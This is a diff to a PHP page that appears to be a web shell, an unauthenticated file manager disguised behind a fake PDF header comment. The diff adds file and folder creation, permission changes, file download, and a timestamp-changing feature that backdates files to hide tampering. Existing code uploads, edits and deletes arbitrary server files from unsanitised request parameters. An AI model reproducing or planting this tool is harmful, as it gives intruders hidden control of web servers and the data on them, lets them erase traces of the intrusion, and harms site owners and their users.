@@ -1,6 +1,5 @@
 <!--%PDF-yt--><!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -12,10 +11,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
         integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        .perm-write { color: green; }
+        .perm-read { color: red; }
+        .perm-execute { color: blue; }
+    </style>
 </head>
 <body>
     <?php
-    //function
     function formatSizeUnits($bytes)
     {
         if ($bytes >= 1073741824) {
@@ -83,7 +86,35 @@
         return str_replace($b, $a, $path);
     }
 
-
+    function formatPermissions($perms) {
+        $perms = decoct($perms);
+        $perms = str_pad($perms, 4, '0', STR_PAD_LEFT);
+        $output = '';
+        for ($i = 1; $i <= 3; $i++) {
+            $part = substr($perms, $i, 1);
+            $output .= '<span class="';
+            // Owner permissions
+            if ($i == 1) {
+                $output .= ($part & 4) ? 'perm-read' : '';
+                $output .= ($part & 2) ? 'perm-write' : '';
+                $output .= ($part & 1) ? 'perm-execute' : '';
+            }
+            // Group permissions
+            elseif ($i == 2) {
+                $output .= ($part & 4) ? 'perm-read' : '';
+                $output .= ($part & 2) ? 'perm-write' : '';
+                $output .= ($part & 1) ? 'perm-execute' : '';
+            }
+            // World permissions
+            elseif ($i == 3) {
+                $output .= ($part & 4) ? 'perm-read' : '';
+                $output .= ($part & 2) ? 'perm-write' : '';
+                $output .= ($part & 1) ? 'perm-execute' : '';
+            }
+            $output .= '">'.$part.'</span>';
+        }
+        return $output;
+    }
 
     $root_path = __DIR__;
     if (isset($_GET['p'])) {
@@ -132,6 +163,8 @@
     echo ('
 </div>
 <div class="form-inline">
+<a href="?newfile&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">New File</button></a>
+<a href="?newdir&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">New Folder</button></a>
 <a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button">Upload File</button></a>
 <a href="?"><button type="button" class="btn btn-dark">HOME</button></a> 
 </div>
@@ -177,6 +210,8 @@
       <td>". date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
       <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
       <td>
+      <a title='Edit Permissions' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . $folder . "'><i class='fa-solid fa-lock'></i></a>
+      <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&date=" . $folder . "'><i class='fa-solid fa-calendar'></i></a>
       <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
       <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
       <td>
@@ -190,7 +225,10 @@
           <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
           <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</a></td>
           <td>
+          <a title='Download' href='?q=" . urlencode(encodePath(PATH)) . "&download=" . $file . "'><i class='fa-solid fa-download'></i></a>
           <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'><i class='fa-solid fa-file-pen'></i></a>
+          <a title='Edit Permissions' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . $file . "'><i class='fa-solid fa-lock'></i></a>
+          <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&date=" . $file . "'><i class='fa-solid fa-calendar'></i></a>
           <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
           <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
           <td>
@@ -204,6 +242,44 @@
             echo ("<script>window.location.replace('?p=');</script>");
         }
     }
+
+    // New File Form
+    if (isset($_GET['newfile'])) {
+        echo '
+    <form method="post">
+        New File Name:
+        <input type="text" name="filename" placeholder="filename.ext">
+        <input type="submit" class="btn btn-dark" value="Create" name="createfile">
+    </form>';
+        if (isset($_POST['createfile'])) {
+            $filename = PATH . "/" . $_POST['filename'];
+            if (file_put_contents($filename, '') !== false) {
+                echo ("<script>alert('File created.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            } else {
+                echo ("<script>alert('Error creating file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            }
+        }
+    }
+
+    // New Directory Form
+    if (isset($_GET['newdir'])) {
+        echo '
+    <form method="post">
+        New Directory Name:
+        <input type="text" name="dirname" placeholder="directory name">
+        <input type="submit" class="btn btn-dark" value="Create" name="createdir">
+    </form>';
+        if (isset($_POST['createdir'])) {
+            $dirname = PATH . "/" . $_POST['dirname'];
+            if (mkdir($dirname)) {
+                echo ("<script>alert('Directory created.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            } else {
+                echo ("<script>alert('Error creating directory.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            }
+        }
+    }
+
+    // Upload Form
     if (isset($_GET['upload'])) {
         echo '
     <form method="post" enctype="multipart/form-data">
@@ -212,6 +288,8 @@
         <input type="submit" class="btn btn-dark" value="Upload" name="upload">
     </form>';
     }
+
+    // Rename Form
     if (isset($_GET['r'])) {
         if (!empty($_GET['r']) && isset($_GET['q'])) {
             echo '
@@ -231,6 +309,7 @@
         }
     }
 
+    // Edit File Form
     if (isset($_GET['e'])) {
         if (!empty($_GET['e']) && isset($_GET['q'])) {
             echo '
@@ -241,20 +320,89 @@
         <input type="submit" class="btn btn-dark" value="Save" name="edit">
     </form>';
 
-    if(isset($_POST['edit'])) {
-        $filename = PATH."/".$_GET['e'];
-        $data = $_POST['data'];
-        $open = fopen($filename,"w");
-        if(fwrite($open,$data)) {
-            echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-        } else {
-            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-        }
-        fclose($open);
-    }
+            if(isset($_POST['edit'])) {
+                $filename = PATH."/".$_GET['e'];
+                $data = $_POST['data'];
+                $open = fopen($filename,"w");
+                if(fwrite($open,$data)) {
+                    echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                } else {
+                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                }
+                fclose($open);
+            }
         }
     }
 
+    // Chmod Form
+    if (isset($_GET['chmod'])) {
+        if (!empty($_GET['chmod']) && isset($_GET['q'])) {
+            $target = PATH . "/" . $_GET['chmod'];
+            $current_perms = substr(sprintf('%o', fileperms($target)), -4);
+            echo '
+    <form method="post">
+        Change Permissions for: ' . $_GET['chmod'] . '<br>
+        Current permissions: ' . $current_perms . '<br>
+        New permissions (octal): 
+        <input type="text" name="newperms" value="' . $current_perms . '" placeholder="e.g. 0755">
+        <input type="submit" class="btn btn-dark" value="Change" name="changeperms">
+    </form>';
+
+            if(isset($_POST['changeperms'])) {
+                $newperms = octdec($_POST['newperms']);
+                if(chmod($target, $newperms)) {
+                    echo ("<script>alert('Permissions changed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                } else {
+                    echo ("<script>alert('Error changing permissions.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                }
+            }
+        }
+    }
+
+    // Change Date Form
+    if (isset($_GET['date'])) {
+        if (!empty($_GET['date']) && isset($_GET['q'])) {
+            $target = PATH . "/" . $_GET['date'];
+            $current_time = filemtime($target);
+            echo '
+    <form method="post">
+        Change Date/Time for: ' . $_GET['date'] . '<br>
+        Current date: ' . date("Y-m-d H:i:s", $current_time) . '<br>
+        New date: 
+        <input type="datetime-local" name="newdate" value="' . date("Y-m-d\TH:i", $current_time) . '">
+        <input type="submit" class="btn btn-dark" value="Change" name="changedate">
+    </form>';
+
+            if(isset($_POST['changedate'])) {
+                $new_time = strtotime($_POST['newdate']);
+                if(touch($target, $new_time)) {
+                    echo ("<script>alert('Date changed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                } else {
+                    echo ("<script>alert('Error changing date.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                }
+            }
+        }
+    }
+
+    // Download File
+    if (isset($_GET['download'])) {
+        if (!empty($_GET['download']) && isset($_GET['q'])) {
+            $file = PATH . "/" . $_GET['download'];
+            if (file_exists($file)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="'.basename($file).'"');
+                header('Expires: 0');
+                header('Cache-Control: must-revalidate');
+                header('Pragma: public');
+                header('Content-Length: ' . filesize($file));
+                readfile($file);
+                exit;
+            }
+        }
+    }
+
+    // File Upload Handler
     if (isset($_POST["upload"])) {
         $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
         if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
@@ -262,8 +410,9 @@
         } else {
             echo "<p>Sorry, there was an error uploading your file.</p>";
         }
-
     }
+
+    // Delete Handler
     if (isset($_GET['d']) && isset($_GET['q'])) {
         $name = PATH . "/" . $_GET['d'];
         if (is_file($name)) {
@@ -285,5 +434,4 @@
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
 </body>
-
 </html>
